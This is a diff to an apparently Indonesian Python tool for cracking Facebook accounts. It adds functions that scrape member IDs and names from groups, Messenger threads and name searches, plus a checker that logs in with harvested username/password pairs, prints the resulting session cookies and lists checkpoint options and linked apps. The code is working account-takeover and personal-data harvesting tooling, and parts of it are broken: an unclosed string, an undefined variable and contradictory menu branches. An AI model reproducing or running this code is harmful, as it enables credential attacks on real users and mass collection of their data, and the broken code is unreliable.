@@ -597,6 +597,270 @@ def uas():
     	menu()
     else:
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
+# DUMP GROUP
+class group:
+	
+	def __init__(self, cookies):
+		self.glist=[]
+		self.cookies=cookies
+		self.manual();exit()
+	def manual(self):
+		print("\n%s%s%s Perlu di ingat group harus bersifat publik atau wajib join group"%(U,til,O))
+		id=raw_input("%s%s%s Id groups%s > %s"%(U,til,O,M,K))
+		if id in(""):
+			self.manual()
+		else:
+			_r_=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
+			if "konten tidak" in _r_.find("title").text.lower():
+				exit("%s%s input id grup yg valid goblok, id error, atau lu belom jooin di grup"%(M,til))
+			else:
+				self.listed={"id":id,"name":_r_.find("title").text}
+				self.fuck_you()
+				print("%s%s%s Nama grup%s > %s%s.."%(U,til,O,M,H,self.listed.get("name")[0:20]))
+				self.dumps("https://mbasic.facebook.com/groups/"+id)
+	def fuck_you(self):
+		self.fl=raw_input('%s%s%s Nama file %s> %s'%(U,til,O,M,K)).replace(" ","_")
+		if self.fl=='':self.fuck_you()
+		open(self.fl,"w").close()
+	def dumps(self, url):
+		_r_=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
+		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.fl).read().splitlines()))))
+		sys.stdout.flush();jeda(0.0050)
+		for _i_ in _r_.find_all("h3"):
+			try:
+				if len(bs4.re.findall("\/",_i_.find("a",href=True).get("href")))==1:
+					ogeh=_i_.find("a",href=True)
+					if "profile.php" in ogeh.get("href"):
+						_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
+						if len(_a_)==0:continue
+						elif _a_ in open(self.fl).read():
+							continue
+						else:
+							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
+							continue
+					else:
+						_a_="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
+						if len(_a_)==0:continue
+						elif _a_ in open(self.fl).read():
+							continue
+						else:
+							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
+			except:continue
+		for _i_ in _r_.find_all("a",href=True):
+			if "Lihat Postingan Lainnya" in _i_.text:
+				while True:
+					try:
+						self.dumps("https://mbasic.facebook.com/"+_i_.get("href"))
+						break
+					except Exception as e:
+						print("\r\x1b[1;91m•%s, retrying..."%e);continue
+		print ('\n\n%s%s Succes dump id member group '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.fl));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
+def cek(arg):
+	if os.path.exists("data/cookies"):
+		if os.path.getsize("data/cookies") !=0:
+			return True
+		else:return False
+	else:return False
+# DUMP PESAN
+class pesan:
+
+    def __init__(self, cookies):
+        self.cookies = cookies
+        #__romz__()
+        #os.system("clear")
+        self.f = raw_input('\n%s%s%s Nama file%s >%s '%(U,til,O,M,K)).replace(' ', '_')
+        if self.f == '':
+            pesan(cookies)
+        open(self.f, 'w').close()
+        self.dump('https://mbasic.facebook.com/messages')
+    def dump(self,url):
+    	open(self.f, 'a+')
+        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
+        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
+        for i in bs.find_all('a', href=True):
+            if '/messages/read' in i.get('href'):
+                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
+                try:
+                    for ip in list(f.pop()):
+                        if self.cookies.get(' c_user') in ip:
+                            continue
+                        else:
+                            if 'pengguna facebook' in i.text.lower():
+                                continue
+                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
+                except Exception as e:
+                    continue
+            if 'Lihat Pesan Sebelumnya' in i.text:
+                self.dump('https://mbasic.facebook.com/' + i.get('href'))
+        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
+        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.f))
+        raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
+# DUMP PENCARIAN NAMA
+def dumpfl():
+    cvds = None
+    cookie = None
+    new = None
+    if cek(1) == False:
+        try:
+            cookie = raw_input("\n%s%s%s Supaya bekerja masukan cookie facebook anda\n%s# %sCookie%s > %s"%(U,til,O,P,O,M,K))
+            cvds = cvd(cookie)
+            new = True
+        except:
+            print("\x1b[1;91m• invalid cookie");dumpfl()
+    else:
+        cvds = cvd(open('data/cookies').read().strip())
+    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
+    if len(bs4.re.findall('logout', r)) != 0:
+        if kueh(cvds) != True:
+            exit("%s%s gagal saat mendeteksi bahasa."%(M,til))
+        #print("\n%s%s%s Login sebagai%s [ %s%s..]"%(U,til,O,M,H,bs4.BeautifulSoup(r,"html.parser").find("title").text[0:10]))
+        if new == True:
+            open('data/cookies', 'w').write(cookie)
+        sim=raw_input("\n%s%s%s Nama file %s>%s "%(U,til,O,M,K)).replace(" ","_")
+        print ("%s%s%s Example nama orang %s[ %sRamdhanRamadhian %s]"%(U,til,O,P,H,P))
+        s=raw_input("%s%s%s Sett nama %s> %s"%(U,til,O,M,K))
+        if s in("romi","Romi","ROMI","Romi Afrizal","Romi afrizal","ROMI AFRIZAL","romi afrizal"):
+        	print("\n%s%s anak anjing mau crack pake nama gw "%(M,til));exit()
+        elif s in("Romi Ganteng","Romi ganteng","ROMI GANTENG","romi ganteng"):
+        	print ("\n%s%s memang ganteng dong abang Romi"%(H,til));exit()
+        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
+    else:
+        try:
+            os.remove('data/cookies')
+        except:
+            pass
+        print '\x1b[1;91m• login fail!'
+        dumpfl()
+    return
+def namah(sim,r,b):
+	open(sim,"a+")
+	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
+	for i in b.find_all("a",href=True):
+		#os.system("clear")
+		#banner()
+		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu"%(U,til,O,M,H,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
+		if "<img alt=" in str(i):
+			if "home.php" in str(i["href"]):
+				continue
+			else:
+				g=str(i["href"])
+				if "profile.php" in g:
+					name=i.find("img").get("alt").replace(", profile picture","")
+					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
+					if len (d) !=0:
+						pk="".join(d)
+						if pk in open(sim).read():
+							pass
+						else:
+							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
+				else:
+					d=bs4.re.findall("/(.*?)\?",g)
+					name=i.find("img").get("alt").replace(", profile picture","")
+					if len(d) !=0:
+						pk="".join(d)
+						if pk in open(sim).read():
+							pass
+						else:
+							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
+		if "Lihat Hasil Selanjutnya" in i.text:
+			namah(sim,r,i["href"])
+	print ('\n\n%s%s Succes dump id pencarian nama '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,sim));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
+# CEK OPSI
+def file_cp():
+    dirs = os.listdir('CP')
+    print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
+    for file in dirs:
+        print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
+    try:
+    	print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
+        opsi()
+    except NameError:
+        print ('%s• file tidak ada'%(M));exit()
+def opsi():
+	CP = ("CP/")
+	romi = raw_input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
+	if romi == "":
+		print("%s%s isi yang benar "%(M,til));jeda(2);opsi()
+	try:
+		file_cp = open(CP+romi, "r").readlines()
+	except IOError:
+		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
+	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
+	print("%s%s%s Total akun %s: %s%s"%(U,til,O,M,P,len(file_cp)));jeda(2)
+	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
+	for fb in file_cp:
+		akun = fb.replace("\n","")
+		ngecek  = akun.split(" ◊ ")
+		print("\n%s%s%s cek akun %s: %s%s"%(U,til,O,M,K,akun.replace(" *--> ","")));jeda(0.07)
+		try:
+			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	print("\n%s%s%s Selesai "%(U,til,O));jeda(0.07)
+	raw_input("%s%s%s kembali "%(U,til,O));jeda(0.07)
+	menu()
+def mengecek(user, pw):
+	mb = ("https://mbasic.facebook.com")
+	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
+	ses = requests.Session()
+	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	data = {}
+	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+	fm = ged.find("form",{"method":"post"})
+	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+	for _i_ in fm.find_all("input"):
+		if _i_.get("name") in list:
+			data.update({_i_.get("name"):_i_.get("value")})
+		else:
+			continue
+	data.update({"email":user,"pass":pw})
+	try:
+		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+	except requests.exceptions.TooManyRedirects:
+		print("%s• redirect overload "%(M))
+	if "c_user" in ses.cookies:
+		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
+		otw = ses.get(run,cookies={'cookie':kuki})
+		gem = parser(otw.content,'html.parser')
+		apk = gem.find('form',method='post')
+		print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
+		_no_ = 0
+		for app in apk.find_all("h3"):
+			data = app.find('span').text
+			_no_+=1
+			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
+	elif "checkpoint" in ses.cookies:
+		form = run.find("form")
+		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+		jzst = form.find("input",{"name":"jazoest"})["value"]
+		nh   = form.find("input",{"name":"nh"})["value"]
+		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
+		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
+		ngew = [yy.text for yy in sesi.find_all("option")]
+		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
+		for _o_ in range(len(ngew)):
+			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
+	elif "login_error" in str(run):
+		eror = run.find("div",{"id":"login_error"}).find("div").text
+		print("%s%s %s"%(M,til,eror));jeda(0.07)
+	else:
+		print("%s%s login gagal, silahkan cek kembali id dan password"%(M,til));jeda(0.07)
+# CEK APLIKASI
+def aplikasi(berhasil,kuki):
+	a = []
+	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
+	otw = ses.get(run,cookies={'cookie':kuki})
+	gem = parser(otw.content,'html.parser')
+	apk = gem.find('form',method='post')
+	_no_ = 0
+	for app in apk.find_all("h3"):
+		try:
+			data = app.find('span').text
+			_no_+=1
+			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
+		except:
+			pass
 # MENU INI AJG
 def menu():
     os.system('clear')
@@ -615,14 +879,18 @@ def menu():
     banner()
     print ('\n %s[ Akulah %s%s%s ] \n'%(P,H,nama,P))
     print (' (%s01%s) Instagram Crack Nama'%(O,U)) 
-    print (' (%s02%s) Facebook Crack Publik'%(O,P)) 
-    print (' (%s03%s) Facebook Crack Follow'%(O,P))
-    print (' (%s04%s) Facebook Crack Postingan '%(O,P))
-    print (' (%s05%s) %sMemulai Operasi Crack %s'%(O,P,M,P)) 
-    print (' (%s06%s) User Agent'%(O,K)) 
-    print (' (%s07%s) Memeriksa Pendapatan Akun'%(O,B))
-    #print (' (%s09%s) Gabung group'%(O,P))
-    #print (' (%s09%s) Informasi Alat'%(O,P))
+    print (' (%s02%s) Facebook Dump Publik'%(O,P)) 
+    print (' (%s03%s) Facebook Dump Follow'%(O,P))
+    print (' (%s04%s) Facebook Dump Postingan '%(O,P))
+    print (' (%s05%s) Facebook Dump Nama'%(O,P))
+    print (' (%s06%s) Facebook Dump Group'%(O,P))
+    print (' (%s07%s) Facebook Dump Pesan Mesengger'%(O,P))
+    print (' (%s08%s) %sMemulai Operasi Crack %s'%(O,P,M,P)) 
+    print (' (%s09%s) User Agent'%(O,K)) 
+    print (' (%s10%s) Memeriksa Pendapatan Akun'%(O,B))
+    print (' (%s11%s) Memeriksa Jenis Chekpoint/Opsi CP
+    #print (' (%s12%s) Gabung group'%(O,P))
+    #print (' (%s13%s) Informasi Alat'%(O,P))
     print (' (%s00%s) Log Out '%(P,H))
     unik = raw_input('\n%s [!] Menu : %s'%(P,O))
     if unik == '':
@@ -635,18 +903,26 @@ def menu():
         followers(romz)
     elif unik in['4','04']:
     	postingan(romz)
-    elif unik in['5','05']:
+    elif slut in['5','05']:
+    	dumpfl();exit()
+    elif slut in['6','06']:
+        group(__romz__())
+    elif slut in['7','07']:
+    	pesan(__romz__())
+    elif unik in['8','08']:
         ngentod().rmdy()
-    elif unik in['6','06']:
+    elif unik in['9','09']:
     	useragent()
-    elif unik in['7','07']:
+    elif unik in['10','10']:
     	print "\n%s [01] Pendapatan Facebook "%(P)
         print "%s [02] Pendapatan Instagram "%(P)
         c = raw_input('\n%s [?] Menu : %s'%(P,O))
     	hasill(c)
-    elif unik in['8','08']:
+    elif unik in['11','11']: 
+        file_cp() 
+    elif unik in['8','11']:
         os.system("xdg-open https://www.facebook.com/groups/924679595149360")
-    elif unik in['9','09']:
+    elif unik in['9','10']:
         print(ingfo)
     elif unik in['0','00']:
         print ('')
